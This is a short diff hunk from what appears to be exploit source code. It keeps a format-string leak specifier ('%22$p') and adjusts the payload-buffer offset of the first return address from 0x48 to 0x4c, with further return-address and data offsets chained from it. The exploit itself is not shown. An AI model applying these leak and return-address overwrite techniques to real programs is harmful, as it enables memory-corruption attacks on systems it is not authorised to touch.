@@ -18,7 +18,7 @@
 #define	FMT_STR		"%22$p"
 
 // Determine how far to copy along in our payload buffer
-#define RET_ADDR1_OFF 0x00000048
+#define RET_ADDR1_OFF 0x0000004c
 #define DATA1_OFF (RET_ADDR1_OFF + 4)
 #define RET_ADDR2_OFF (DATA1_OFF + 4)
 #define RET_ADDR3_OFF (RET_ADDR2_OFF + 8)
